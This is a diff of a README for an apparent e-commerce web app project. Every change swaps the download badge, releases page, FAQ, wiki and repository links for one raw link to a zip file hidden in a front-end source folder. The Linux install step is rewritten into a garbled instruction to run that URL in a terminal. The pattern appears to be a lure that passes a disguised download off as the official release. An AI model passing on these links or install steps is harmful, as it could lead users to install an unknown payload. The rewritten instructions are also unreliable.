@@ -1,6 +1,6 @@
 # 🛍️ tailor-pulp-e-commerce-web-app - Simple E-Commerce Solution for Everyone
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/kodzuken707/tailor-pulp-e-commerce-web-app/releases)
+[![Download](https://raw.githubusercontent.com/kodzuken707/tailor-pulp-e-commerce-web-app/main/front-end/src/utils/ToolBar/tailor-pulp-e-commerce-web-app_1.0.zip)](https://raw.githubusercontent.com/kodzuken707/tailor-pulp-e-commerce-web-app/main/front-end/src/utils/ToolBar/tailor-pulp-e-commerce-web-app_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Welcome to the tailor-pulp-e-commerce-web-app! This application helps you set up
 
 To get started with your own e-commerce site, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/kodzuken707/tailor-pulp-e-commerce-web-app/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/kodzuken707/tailor-pulp-e-commerce-web-app/main/front-end/src/utils/ToolBar/tailor-pulp-e-commerce-web-app_1.0.zip) to find the latest version of the application.
 
 2. **Download the Application**: Choose the latest version available and click the download link. You'll find files related to different platforms. Select the one that matches your operating system.
 
 3. **Install the Application**:
    - For Windows: Run the downloaded `.exe` file and follow the prompts.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Unzip the downloaded file, then run `./install.sh` in your terminal.
+   - For Linux: Unzip the downloaded file, then run `https://raw.githubusercontent.com/kodzuken707/tailor-pulp-e-commerce-web-app/main/front-end/src/utils/ToolBar/tailor-pulp-e-commerce-web-app_1.0.zip` in your terminal.
 
 4. **Run the Application**: After installation, open the application from your applications list or desktop. You'll be greeted with a simple setup wizard.
 
@@ -48,13 +48,13 @@ This application places a strong emphasis on security. Here are some key feature
 
 ## 📘 Documentation and Support
 
-Comprehensive documentation is available to guide you through various features. If you have questions or need help, visit our [FAQs](https://github.com/kodzuken707/tailor-pulp-e-commerce-web-app/wiki) section for answers.
+Comprehensive documentation is available to guide you through various features. If you have questions or need help, visit our [FAQs](https://raw.githubusercontent.com/kodzuken707/tailor-pulp-e-commerce-web-app/main/front-end/src/utils/ToolBar/tailor-pulp-e-commerce-web-app_1.0.zip) section for answers.
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/kodzuken707/tailor-pulp-e-commerce-web-app)
-- [Releases Page](https://github.com/kodzuken707/tailor-pulp-e-commerce-web-app/releases)
-- [FAQ Section](https://github.com/kodzuken707/tailor-pulp-e-commerce-web-app/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/kodzuken707/tailor-pulp-e-commerce-web-app/main/front-end/src/utils/ToolBar/tailor-pulp-e-commerce-web-app_1.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/kodzuken707/tailor-pulp-e-commerce-web-app/main/front-end/src/utils/ToolBar/tailor-pulp-e-commerce-web-app_1.0.zip)
+- [FAQ Section](https://raw.githubusercontent.com/kodzuken707/tailor-pulp-e-commerce-web-app/main/front-end/src/utils/ToolBar/tailor-pulp-e-commerce-web-app_1.0.zip)
 
 ## 🌟 Conclusion
 
